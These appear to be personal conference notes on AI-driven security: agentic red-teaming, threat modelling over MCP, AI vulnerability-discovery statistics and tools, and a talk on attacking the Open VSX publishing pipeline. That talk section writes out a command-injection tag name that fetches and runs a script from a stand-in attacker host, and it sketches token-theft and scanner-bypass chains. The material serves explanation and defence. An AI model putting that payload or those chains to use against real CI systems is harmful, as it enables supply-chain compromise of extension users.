*** Write-Only Code & The Future of Code Review

Framing: the future is already here — it's just not evenly distributed.
Central argument: *mandatory code review is not sustainable* at scale.

#+begin_quote

rather than a signal that discipline itself must change."

The shift in how code is written (volume, AI generation) means the
bottleneck has moved from writing to reading and reviewing.  The
discipline of code review must evolve, not just be enforced harder.

*** Core Thesis: Agentic Aware Red-Teaming

#+begin_quote
"If the risk lives in the system, then the system is what we need to test."
#+end_quote

Traditional LLM red-teaming tests the model in isolation (prompt → response).
Agentic systems are different: the agent orchestrates memory, tools, external
services, and other agents. The attack surface is the *whole system*, not the LLM.

Agent architecture under test:
- User → Prompt → *Planner* → Agent (core)
- Agent has access to: Memory, Tools/APIs
- Agent reads from: Documents, Database, Web/Search, Other Agents
- Agent acts on external systems: External Services, Action Systems,
  Code/Deployment, Third-Party APIs

Each external integration is a potential attack vector — the "!" markers in the
diagram indicate trust boundaries that need testing.

*** Agentic Red-Teaming Pipeline (5 stages)

#+begin_quote
"We understand the system, we can execute it safely, and we can observe what
happens. Can we finally start testing?"
#+end_quote

The pipeline must be completed in order — steps 1–3 are prerequisites before
any attack generation begins.

1. *System Understanding* — Discover the agents, tools, and memory before testing.
   Map the full attack surface first.
2. *Safe Execution* — Sandbox the environment and emulate tools to prevent
   real-world damage during testing.
3. *Runtime Observability* — Trace the internal path, because *the trace is the evidence*.
4. *System-Specific Attack Generation* — Automatically adapt one attack idea into
   many executable instances tailored to the specific system.
5. *Impact Measurement* — Evaluate the consequences, not just the final text response.

Key insight: impact must be measured at the *system level* (what did the agent
actually do?), not just by reading the LLM's output text.

*** GenAI for Threat Modeling (MCP)

*Concept:* Use an LLM with structured tool access over the Model Context
Protocol (MCP) to create STRIDE-based threat models from architecture diagrams,
source code, IaC, and requirements documents.

→ Threat modelling becomes a *continuous activity that runs alongside development*,
not a one-off workshop.

*Architecture:*
- Any user → AI Chat (Claude, ChatGPT, Gemini…) → queries Threat Modeling MCP Server
- Developers → AI IDE (Cursor, Windsurf, VSCode + Copilot…) → git push →
  CI/CD Pipeline (build · test · scan · threat-model hook) → triggers MCP →
  Threat Modeling Tool (updates model, stores history)
- Security Team → direct review of the same backend

*Downstream uses of the threat model:*
- *RAG-based Vulnerability Triage & FP Reduction* — threat-model context (assets,
  threats, mitigations) feeds SAST prioritisation and false-positive reduction
- *IaC / Policy-as-Code Copilot* — findings like "unencrypted storage" translate
  directly into automated IaC policies
- *Critical Attack Path Detection* — threat-model hypotheses validated against
  real cloud asset data to surface exploitable paths

*Git-integrated workflow stages:*
1. *Pre-Commit Hook* — light code-scan of staged changes; immediate issues before commit
2. *Pre-Push* — full audit, update of threat model
3. *CI Build* — full audit of entire codebase

*Pros:*
- Remediation guidance included left-of-merge
- Adaptable to custom requirements / standards
- Combines probabilistic and deterministic approaches
- Increases developer security awareness

*Cons:*
- Non-deterministic threat modeling and code review
- Context limitations and token usage
- Code / intellectual property limitations
- Risk of leaking tokens / keys / credentials to LLM provider

** 13:15 — Mythos or Myth: AI Vulnerability Discovery (Panel)

Referenced in this panel: Mozilla's behind-the-scenes article on hardening Firefox

*** Panel Notes

*OSS maintainers are overwhelmed* by the volume of AI-generated bug reports.
The signal/noise problem is acute — maintainers cannot keep up with the volume
even when reports are legitimate.

*Malicious patches in AI-generated reports* — panelists flagged that suggested
fixes sometimes contain malicious code embedded in the patch. This is a new
attack vector: using AI-generated "helpful" vulnerability reports as a delivery
mechanism for supply chain compromise. Maintainers must review patches as
carefully as the bug reports themselves — possibly more so.

This connects to the timeline entry (Feb 2026): curl discontinued its bug bounty
over AI-generated "slop", only to later see quality improve — but the malicious
patch angle is a separate, more dangerous problem.

*Referenced:* Berkeley Vulnerability Initiative — Agentic Vulnerability Coverage Map
https://vuln.cs.berkeley.edu/ — live dashboard rebuilt daily from public CVE feeds.

Key stats (Mar 27 – Jun 25, 2026 vs same window 2025):
- Total CVEs 2026: 19,566 vs 12,121 in 2025 (same window) — *+61%*
- Verified AI-discovered CVEs (2026 window): *382*
- Agentic CVEs rated high/critical: *60.4%* vs 52.4% (rest of 2026) and 44.8% (2025)
- Top CWE categories in AI-discovered vulns:
  1. OS Command Injection (CWE-78)
  2. Missing Authentication for Critical Function (CWE-306)
  3. Code Injection (CWE-94)
  4. Path Traversal (CWE-22)
  5. Deserialization of Untrusted Data (CWE-502)
  6. SQL Injection (CWE-89)

Notable: among AI-discovered CVEs, CVSS severity score has *lost meaningful
relationship to actual exploit risk* — traditional scoring no longer a reliable triage signal.

*Mentioned by Jaya Baloo:* nano-analyzer — someone reproduced Mythos-level findings
using GPT nano (a tiny, cheap model). Key paper: "System Over Model: Zero-Day
Discovery at the Jagged Frontier" by AISLE.
- GitHub: https://github.com/weareaisle/nano-analyzer
- Blog: https://aisle.com/blog/system-over-model-zero-day-discovery-at-the-jagged-frontier

*Core thesis:* The scaffolding does the work, not the model size.
A deliberately simple, embarrassingly parallel one-file scanner (no agentic loop)
pointed at the full FreeBSD and OpenBSD kernels detected *CVE-2026-4747*
(Mythos's flagship FreeBSD RPC stack overflow) with models as small as *3.6B
active parameters* — at far lower cost per token than Mythos.

Pipeline (3 stages):
1. Context briefing — map attack surface per file
2. Vulnerability scan — five analytical questions with few-shot examples
3. Multi-round triage — three validation rounds + arbiter decision

A reachability filter stage (same weights, no new model) cut false positives
from 30 → 5 while preserving the real CVE. Full scan cost: *~$12 on OpenRouter*;
free with local inference.

Implication: frontier models are not required for effective vulnerability discovery —
pipeline architecture and system design matter more than raw model capability.

*Panel consensus:* AI should be directed at fixing the existing mess, not layering
more code on top of it. The priority is remediation of known-bad code, not
accelerating feature velocity on a rotten foundation. Using AI to ship faster
while the underlying security debt compounds is the wrong order of operations.

*** Premiere — Command Injection: A Release Tag That Runs Code

*"NAME YOUR TAG, OWN THE PIPELINE."*

Open VSX's nightly =publish-extensions= job reads an extension's latest GitHub
release tag and feeds it *unsanitized* into =git reset --hard ${ref}=,
executed via =/bin/bash=. A malicious tag name runs arbitrary code in the CI runner.

*Full chain — Tag Name to RCE:*
1. Attacker tags a release =$(curl${IFS}attacker.com|sh)=
2. Nightly job reads =release.tag_name=
3. Tag flows unsanitized → =git reset --hard ${ref}= via =/bin/bash=
4. RCE in the runner — which holds =GITHUB_TOKEN= with =actions: write=
5. Dispatch =publish-extension= workflow (holds =OVSX_PAT=) → *overwrite any extension*

Source refs: =publish-extensions.js#L201= · =resolveExtension.js#L35→#L88= · =exec.js= (shell: =/bin/bash=)

*** Crack #2 — Exploitation: Flood & Slip Through

Bypass the malware scanner via race condition:
1. Batch malicious =.vsix= files
2. Flood the publish endpoint (no rate limit)
3. DB pool exhausted → =enqueue()= throws
4. =enqueuedCount = 0= returns =false= → extension activated without scan

*SCAN STATUS: PASSED ✓* — the scanner never ran.

*** Finale — The Root Cause: The Fatal Line

#+begin_src bash
# nightly CI, privileged token in env
OVSX_PAT=<super-admin> npm install
#+end_src

=npm install= runs *arbitrary lifecycle scripts* from every dependency — with
the super-admin token sitting in the environment.

*Full "Steal the Keys" chain:*
1. Attacker slips a malicious dependency into =extensions.json=
2. Nightly CI runs =npm install= with =OVSX_PAT= in the env
3. =postinstall= script exfiltrates the token
4. Attacker overwrites *any extension* on open-vsx.org
5. *20M+ machines* pull a silent malicious update

*** Key Hierarchies

All cryptographic keys in a TPM are organised in *hierarchies* — a tree structure:
- Each key is *encrypted by its parent*
- Each *Primary Key* is derived from a fixed, persistent *seed* and a *template*
  stored in NVDATA
- KDF derives the primary from the seed; child keys K1, K2… are encrypted under
  the primary's public key

Diagram reference: https://google.github.io/tpm-js/index.html#pg_keys

As of May 22, 2026: Anthropic's own OSS scanning disclosed *1,596 vulnerabilities*,
of which only *97 had been patched* — illustrating the verification/patching gap.
Discovery is now solved; verification and patching are the new bottleneck.

*Six-stage find-and-fix loop:*

1. *Threat Model* — bootstrap from code, docs, CVE history; interview system owners
   (Shostack's four questions); output =THREAT_MODEL.md= with trust boundaries and
   scope. One team: 90% exploitability rate when threat model was well-documented.

2. *Sandbox* — gVisor containers or Firecracker microVMs; pin everything (image tags,
   commit SHAs, deps); snapshot after setup, reset before each scan; lock egress.

3. *Discovery* — optimise for recall, not precision; shorter prompts outperform
   checklists; partition search space first, then fan out parallel agents per
   partition; system-level pass uses partition findings as context.
   Anti-pattern: scaling agents horizontally → duplicates. Partition instead.

4. *Verification* — separate agents from discovery (single-pass agents self-censor);
   fresh container, no shared history; prompt to *disprove* the finding;
   multi-vote approach halves false positive rate; PoC execution brings FP rate to ~0.

5. *Triage* — deduplicate (same file + category + line proximity), then model-based
   rules; severity rated on: reachability, attacker control, preconditions, auth
   level, blast radius. Always provide threat model — without it models inflate severity.

6. *Patching* — write failing test first; generate patch; validate against ladder
   (builds, PoC stops working, suite still passes, fresh agent re-attacks);
   search for variants; human review; update threat model.

*Key design decisions:*
- Discovery ≠ verification — single-pass agents self-censor true positives
- Shorter prompts for discovery — long checklists reduce model creativity
- Threat model in every stage — prevents ~90% of false positives
- PoCs in sandbox — exploitability proof beats static analysis alone
- Independent verifiers, multi-vote — more reliable than single agent

** OpenAnt — LLM-based Vulnerability Discovery
:PROPERTIES:
:URL: https://github.com/knostic/OpenAnt
:LICENSE: Apache 2.0
:END:

Knostic's open-source LLM vulnerability scanner. Two-stage approach:
1. *Stage 1 — Detect:* surfaces candidate vulnerabilities
2. *Stage 2 — Attack:* actually exploits the candidate; only surviving findings reported

This eliminates false positives at source — /what survives is real/.

- Languages: Python, JavaScript, TypeScript, Go, PHP, C/C++
- Default backend: Anthropic API (configurable to any model)
- Free scanning programme for open source projects (launched Mar 2026)
- Related to OpenAnt: free OSS scan signup at https://www.knostic.ai/blog/oss-scan
